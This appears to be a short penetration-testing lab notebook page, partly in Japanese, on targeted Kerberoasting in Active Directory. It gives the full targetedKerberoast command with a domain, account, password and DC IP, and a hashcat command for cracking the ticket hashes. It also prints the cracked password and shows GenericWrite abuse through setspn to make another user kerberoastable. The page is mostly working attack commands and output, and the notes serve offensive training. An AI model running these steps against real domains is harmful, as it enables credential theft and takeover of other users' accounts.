
# Repository
https://github.com/ShutdownRepo/targetedKerberoast
# Attack
```zsh
python3 targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.186.40
```
![](Assets/Images/Pasted%20image%2020260425201039.png)

# Crack
```zsh
sudo hashcat -m 13100 kerberoastables.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
![](Assets/Images/Pasted%20image%2020260425201106.png)
haze1988

---

# Example
## CheckRole
![](Assets/Images/Pasted%20image%2020260425201335.png)
yulia.weberがboris.crawfordに対してGenericWriteを持っている
## SPNの書き込み
```powershell
PS C:\Users\yulia.weber\desktop> setspn -A MSSQLSvc/asdf laser\boris.crawford
Checking domain DC=laser,DC=com

Registering ServicePrincipalNames for CN=boris.crawford,CN=Users,DC=laser,DC=com
        MSSQLSvc/asdf
Updated object
```

![](Assets/Images/Pasted%20image%2020260425201415.png)
![](Assets/Images/Pasted%20image%2020260425201425.png)
![](Assets/Images/Pasted%20image%2020260425201433.png)
